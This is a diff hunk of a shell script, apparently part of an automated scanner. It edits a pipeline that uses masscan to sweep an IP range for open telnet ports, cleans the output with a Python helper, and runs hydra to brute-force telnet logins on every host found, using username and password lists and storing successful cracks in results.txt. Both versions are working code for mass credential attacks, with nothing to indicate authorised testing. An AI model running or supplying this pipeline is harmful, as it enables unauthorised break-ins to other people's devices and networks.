@@ -24,7 +24,7 @@ cd auto;
 
 
 
-docker run --rm sha512sum/masscan --range $VAR1 --rate 10000 -p23 --open >> ip172.txt # Save port masscan Range 
-python3 fileformatter3.py # here we clean the brut file
-hydra -vV -M ip172.txt telnet -e n -L $(echo $PWD)/usertelnet -P $(echo $PWD)/passtelnet -t2 -W4 -I -q >> results.txt # scan crack
-rm ip172.txt # remove the temporary file
+docker run --rm sha512sum/masscan --range $VAR1 --rate 10000 -p23 --open >> ip192.txt # Save port masscan Range 
+python3 fileformatter1.py # here we clean the brut file
+hydra -V -e nsr -M ip192.txt telnet -e n -L $(echo $PWD)/usertelnet -P $(echo $PWD)/passtelnet -t2 -W4 -I >> results.txt # scan crack
+rm ip192.txt # remove the temporary file
